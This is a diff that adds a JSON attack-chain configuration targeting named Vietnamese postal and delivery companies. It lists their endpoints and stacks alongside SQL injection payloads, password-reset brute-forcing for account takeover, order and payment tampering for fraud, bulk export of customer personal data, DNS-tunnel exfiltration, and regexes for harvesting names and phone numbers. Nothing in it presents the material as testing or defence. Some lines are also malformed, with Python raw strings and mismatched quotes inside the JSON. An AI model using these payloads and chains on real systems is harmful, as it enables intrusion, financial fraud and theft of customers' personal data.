@@ -1,0 +1,493 @@
+{
+  "attack_chains": {
+    "tracking_to_database": {
+      "name": "订单追踪 → 数据库渗透链",
+      "description": "通过订单追踪功能逐步渗透数据库",
+      "target_business_types": ["LOGISTICS_TRACKING", "ORDER_MANAGEMENT"],
+      "priority": "high",
+      "steps": [
+        {
+          "step_id": "1",
+          "name": "时间盲注检测",
+          "action": "sqli_injection",
+          "target_parameter": "MaDonHang",
+          "payload": "'; WAITFOR DELAY '0:0:2' --",
+          "detection_method": "response_time_analysis",
+          "expected_result": "检测到2秒延迟响应",
+          "success_criteria": "response_time > 1.5s",
+          "fallback": "error_based_sqli"
+        },
+        {
+          "step_id": "2",
+          "name": "提取真实订单号",
+          "action": "sqli_extraction",
+          "target_parameter": "MaDonHang",
+          "payload": "'; SELECT TOP 1 MaDon FROM DONHANG --",
+          "detection_method": "regex_order_id",
+          "expected_result": "获取到真实的订单ID",
+          "success_criteria": "found_order_ids_count > 0",
+          "fallback": "brute_force_order_id"
+        },
+        {
+          "step_id": "3",
+          "name": "滥用API接口",
+          "action": "api_abuse",
+          "target_endpoint": "api/orders",
+          "payload": "提取的订单号",
+          "detection_method": "response_content_analysis",
+          "expected_result": "获取完整订单详情",
+          "success_criteria": "response_contains_customer_data",
+          "fallback": "direct_api_access"
+        },
+        {
+          "step_id": "4",
+          "name": "解析客户信息",
+          "action": "data_extraction",
+          "target_data": "customer_details",
+          "payload": "客户姓名、电话、地址",
+          "detection_method": "regex_vietnamese_data",
+          "expected_result": "获取客户PII数据",
+          "success_criteria": "extracted_pii_count > 0",
+          "fallback": "database_schema_recon"
+        },
+        {
+          "step_id": "5",
+          "name": "数据库武器化",
+          "action": "database_weaponization",
+          "target_table": "KHACHHANG",
+          "payload": "SELECT * FROM KHACHHANG",
+          "detection_method": "bulk_data_export",
+          "expected_result": "批量导出客户数据",
+          "success_criteria": "exported_records_count > 100",
+          "fallback": "table_structure_recon"
+        }
+      ],
+      "timing": {
+        "step_delays": [0.1, 0.2, 0.15, 0.1, 0.3],
+        "total_timeout": 300
+      },
+      "payload_variations": [
+        {
+          "type": "time_based",
+          "base_payload": "'; WAITFOR DELAY '0:0:{delay}' --",
+          "parameters": {
+            "delay": [2, 3, 5]
+          }
+        },
+        {
+          "type": "union_based",
+          "base_payload": "' UNION SELECT NULL, MaDon, NULL FROM DONHANG --",
+          "parameters": {}
+        }
+      ]
+    },
+    "password_reset_to_account": {
+      "name": "密码重置 → 账号接管链",
+      "description": "利用密码重置功能进行账号接管",
+      "target_business_types": ["CUSTOMER_PORTAL", "ORDER_MANAGEMENT"],
+      "priority": "high",
+      "steps": [
+        {
+          "step_id": "1",
+          "name": "密码重置逻辑检测",
+          "action": "logic_flaw_test",
+          "target_endpoint": "password_reset",
+          "payload": "test_user_nonexistent",
+          "detection_method": "response_analysis",
+          "expected_result": "检查逻辑漏洞",
+          "success_criteria": "response_leaks_information",
+          "fallback": "brute_force_validation"
+        },
+        {
+          "step_id": "2",
+          "name": "验证码爆破",
+          "action": "brute_force",
+          "target_endpoint": "password_reset",
+          "payload": "4_digit_code",
+          "detection_method": "success_detection",
+          "expected_result": "成功重置密码",
+          "success_criteria": "reset_successful",
+          "fallback": "captcha_bypass"
+        },
+        {
+          "step_id": "3",
+          "name": "账号接管",
+          "action": "account_takeover",
+          "target_endpoint": "login",
+          "payload": "reset_credentials",
+          "detection_method": "login_success",
+          "expected_result": "成功登录客户账号",
+          "success_criteria": "login_successful",
+          "fallback": "session_hijacking"
+        },
+        {
+          "step_id": "4",
+          "name": "信息爬取",
+          "action": "data_crawling",
+          "target_endpoint": "customer_dashboard",
+          "payload": "historical_orders",
+          "detection_method": "data_extraction",
+          "expected_result": "获取客户完整历史",
+          "success_criteria": "extracted_history_count > 10",
+          "fallback": "limited_data_access"
+        },
+        {
+          "step_id": "5",
+          "name": "横向移动",
+          "action": "horizontal_movement",
+          "target_endpoint": "enterprise_accounts",
+          "payload": "existing_permissions",
+          "detection_method": "privilege_escalation",
+          "expected_result": "渗透企业内部",
+          "success_criteria": "access_enterprise_data",
+          "fallback": "social_engineering"
+        }
+      ],
+      "timing": {
+        "step_delays": [0.5, 1.0, 0.3, 0.2, 0.5],
+        "total_timeout": 600
+      },
+      "payload_variations": [
+        {
+          "type": "username_variations",
+          "usernames": [
+            "test_user",
+            "admin",
+            "customer",
+            "support",
+            "user123"
+          ]
+        },
+        {
+          "type": "validation_bypass",
+          "payloads": [
+            "0000",
+            "1234",
+            "1111",
+            "9999",
+            "8888"
+          ]
+        }
+      ]
+    },
+    "order_manipulation": {
+      "name": "订单篡改 → 财务欺诈链",
+      "description": "直接篡改订单状态和金额进行财务欺诈",
+      "target_business_types": ["ORDER_MANAGEMENT", "PAYMENT_GATEWAY"],
+      "priority": "critical",
+      "steps": [
+        {
+          "step_id": "1",
+          "name": "订单管理权限检测",
+          "action": "privilege_test",
+          "target_endpoint": "order_admin",
+          "payload": "unauthorized_access",
+          "detection_method": "access_control",
+          "expected_result": "检测权限漏洞",
+          "success_criteria": "bypass_access_control",
+          "fallback": "insecure_direct_object_reference"
+        },
+        {
+          "step_id": "2",
+          "name": "订单状态篡改",
+          "action": "status_manipulation",
+          "target_endpoint": "update_order",
+          "payload": "status_delivered",
+          "detection_method": "state_change_detection",
+          "expected_result": "修改订单状态",
+          "success_criteria": "status_changed_successfully",
+          "fallback": "state_injection"
+        },
+        {
+          "step_id": "3",
+          "name": "运费修改",
+          "action": "shipping_fraud",
+          "target_endpoint": "update_shipping",
+          "payload": "shipping_cost_zero",
+          "detection_method": "cost_change_detection",
+          "expected_result": "修改运费",
+          "success_criteria": "shipping_cost_changed",
+          "fallback": "billing_bypass"
+        },
+        {
+          "step_id": "4",
+          "name": "金额操纵",
+          "action": "amount_manipulation",
+          "target_endpoint": "update_payment",
+          "payload": "amount_increase",
+          "detection_method": "financial_impact",
+          "expected_result": "增加订单金额",
+          "success_criteria": "amount_increased",
+          "fallback": "refund_fraud"
+        },
+        {
+          "step_id": "5",
+          "name": "批量订单处理",
+          "action": "bulk_processing",
+          "target_endpoint": "batch_orders",
+          "payload": "multiple_orders",
+          "detection_method": "bulk_operation",
+          "expected_result": "批量处理订单",
+          "success_criteria": "bulk_operations_successful",
+          "fallback": "individual_manipulation"
+        }
+      ],
+      "timing": {
+        "step_delays": [0.1, 0.2, 0.1, 0.3, 0.5],
+        "total_timeout": 180
+      },
+      "payload_variations": [
+        {
+          "type": "status_variations",
+          "statuses": [
+            "Đã giao",
+            "Hủy đơn",
+            "Đang giao",
+            "Chờ xử lý"
+          ]
+        },
+        {
+          "type": "cost_variations",
+          "costs": [0, 999999, 1000000, -100000]
+        }
+      ]
+    },
+    "customer_data_exfil": {
+      "name": "客户数据 → 信息泄露链",
+      "description": "批量导出客户个人信息",
+      "target_business_types": ["CUSTOMER_PORTAL", "ORDER_MANAGEMENT"],
+      "priority": "high",
+      "steps": [
+        {
+          "step_id": "1",
+          "name": "客户数据库探测",
+          "action": "database_recon",
+          "target_endpoint": "api/customers",
+          "payload": "schema_discovery",
+          "detection_method": "schema_analysis",
+          "expected_result": "发现客户表结构",
+          "success_criteria": "table_structure_identified",
+          "fallback": "brute_force_tables"
+        },
+        {
+          "step_id": "2",
+          "name": "PII数据提取",
+          "action": "pii_extraction",
+          "target_endpoint": "api/customers/search",
+          "payload": "personal_info_query",
+          "detection_method": "data_analysis",
+          "expected_result": "提取个人信息",
+          "success_criteria": "pii_data_extracted",
+          "fallback": "data_dumping"
+        },
+        {
+          "step_id": "3",
+          "name": "批量数据导出",
+          "action": "bulk_export",
+          "target_endpoint": "api/customers/export",
+          "payload": "all_customers",
+          "detection_method": "export_success",
+          "expected_result": "批量导出数据",
+          "success_criteria": "export_completed",
+          "fallback": "chunked_export"
+        },
+        {
+          "step_id": "4",
+          "name": "数据格式转换",
+          "action": "data_conversion",
+          "target_format": "json/csv",
+          "payload": "structured_data",
+          "detection_method": "format_verification",
+          "expected_result": "转换数据格式",
+          "success_criteria": "format_conversion_successful",
+          "fallback": "raw_data_export"
+        },
+        {
+          "step_id": "5",
+          "name": "隐蔽式外泄",
+          "action": "covert_exfil",
+          "target_method": "dns_tunneling",
+          "payload": "encrypted_data",
+          "detection_method": "exfil_success",
+          "expected_result": "数据成功外泄",
+          "success_criteria": "data_exfiltrated",
+          "fallback": "multiple_channels"
+        }
+      ],
+      "timing": {
+        "step_delays": [0.2, 0.3, 0.5, 0.1, 1.0],
+        "total_timeout": 600
+      },
+      "payload_variations": [
+        {
+          "type": "data_fields",
+          "fields": [
+            "HoTen",
+            "DienThoai",
+            "DiaChi",
+            "Email",
+            "NgaySinh"
+          ]
+        },
+        {
+          "type": "export_formats",
+          "formats": ["json", "csv", "xml", "pdf"]
+        }
+      ]
+    },
+    "payment_bypass": {
+      "name": "支付绕过 → 免费服务链",
+      "description": "绕过支付流程获取免费服务",
+      "target_business_types": ["PAYMENT_GATEWAY", "ORDER_MANAGEMENT"],
+      "priority": "high",
+      "steps": [
+        {
+          "step_id": "1",
+          "name": "支付网关测试",
+          "action": "payment_test",
+          "target_endpoint": "payment/process",
+          "payload": "invalid_transaction",
+          "detection_method": "payment_validation",
+          "expected_result": "检测支付漏洞",
+          "success_criteria": "payment_validation_bypassed",
+          "fallback": "session_hijacking"
+        },
+        {
+          "step_id": "2",
+          "name": "金额篡改",
+          "action": "amount_manipulation",
+          "target_endpoint": "payment/amount",
+          "payload": "zero_amount",
+          "detection_method": "amount_change",
+          "expected_result": "修改支付金额",
+          "success_criteria": "amount_changed",
+          "fallback": "currency_manipulation"
+        },
+        {
+          "step_id": "3",
+          "name": "支付状态伪造",
+          "action": "status_forgery",
+          "target_endpoint": "payment/status",
+          "payload": "paid_status",
+          "detection_method": "status_change",
+          "expected_result": "伪造支付状态",
+          "success_criteria": "status_forged",
+          "fallback": "status_injection"
+        },
+        {
+          "step_id": "4",
+          "name": "订单完成伪造",
+          "action": "order_completion",
+          "target_endpoint": "order/complete",
+          "payload": "false_completion",
+          "detection_method": "completion_detection",
+          "expected_result": "伪造订单完成",
+          "success_criteria": "completion_forged",
+          "fallback": "order_injection"
+        },
+        {
+          "step_id": "5",
+          "name": "服务滥用",
+          "action": "service_abuse",
+          "target_endpoint": "service/access",
+          "payload": "unauthorized_access",
+          "detection_method": "service_access",
+          "expected_result": "滥用付费服务",
+          "success_criteria": "service_access_granted",
+          "fallback": "privilege_escalation"
+        }
+      ],
+      "timing": {
+        "step_delays": [0.5, 0.3, 0.2, 0.4, 0.6],
+        "total_timeout": 240
+      },
+      "payload_variations": [
+        {
+          "type": "amount_variations",
+          "amounts": [0, -1, 999999, 0.01]
+        },
+        {
+          "type": "status_variations",
+          "statuses": ["paid", "completed", "success", "verified"]
+        }
+      ]
+    }
+  },
+  "target_systems": {
+    "viettelpost": {
+      "name": "Viettel Post",
+      "endpoints": {
+        "tracking": ["/TraCuuDonHang", "/Tracking"],
+        "management": ["/QuanLyDonHang", "/OrderManagement"],
+        "payment": ["/ThanhToan", "/Payment"]
+      },
+      "characteristics": {
+        "technology": "IIS/ASP.NET",
+        "database": "SQL Server",
+        "localization": "Vietnamese"
+      },
+      "preferred_chains": ["tracking_to_database", "order_manipulation"]
+    },
+    "vnpost": {
+      "name": "VNPost",
+      "endpoints": {
+        "tracking": ["/VanDon/Tracking", "/TrackAndTrace"],
+        "management": ["/DonHang/QuanLy", "/OrderAdmin"],
+        "payment": ["/ThanhToan", "/Payment"]
+      },
+      "characteristics": {
+        "technology": "Java/Tomcat",
+        "database": "MySQL",
+        "localization": "Vietnamese"
+      },
+      "preferred_chains": ["password_reset_to_account", "customer_data_exfil"]
+    },
+    "giaohangnhanh": {
+      "name": "Giao Hàng Nhanh",
+      "endpoints": {
+        "tracking": ["/Track", "/Tracking"],
+        "management": [ "/Admin", "/OrderManagement"],
+        "payment": ["/Payment", "/ThanhToan"]
+      },
+      "characteristics": {
+        "technology": "PHP/Apache",
+        "database": "MySQL",
+        "localization": "Vietnamese"
+      },
+      "preferred_chains": ["order_manipulation", "payment_bypass"]
+    },
+    "generic_vietnamese_logistics": {
+      "name": "通用越南物流系统",
+      "endpoints": {
+        "tracking": ["/Tracking", "/TraCuu", "/TrackAndTrace"],
+        "management": ["/Admin", "/Management", "/Dashboard"],
+        "payment": ["/Payment", "/Checkout"]
+      },
+      "characteristics": {
+        "technology": "Unknown",
+        "database": "Unknown",
+        "localization": "Vietnamese"
+      },
+      "preferred_chains": ["tracking_to_database", "customer_data_exfil"]
+    }
+  },
+  "payload_templates": {
+    "sql_injection": {
+      "time_based": "'; WAITFOR DELAY '0:0:{delay}' --",
+      "error_based": "' AND 1=CONVERT(int, (SELECT TOP 1 {column} FROM {table}))--",
+      "union_based": "' UNION SELECT NULL, {columns} FROM {table}--",
+      "boolean_based": "' OR '{condition}'='--"
+    },
+    "logic_flaw": {
+      "brute_force": "{value}",
+      "id_manipulation": "{id}",
+      "validation_bypass": "{code}"
+    },
+    "data_extraction": {
+      "regex_names": r'[Nguyễn|Trần|Lê|Phạm|Huỳnh|Phan|Vũ|Đặng|Bùi|Đỗ] [A-Z][a-z]+ [A-Z][a-z]+',
+      "regex_phones': r'(0[3|5|7|8|9]\d{8})',
+      "regex_orders': r'VP\d+|DH\d+|\d{10,}',
+      "regex_emails': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+    }
+  }
+}
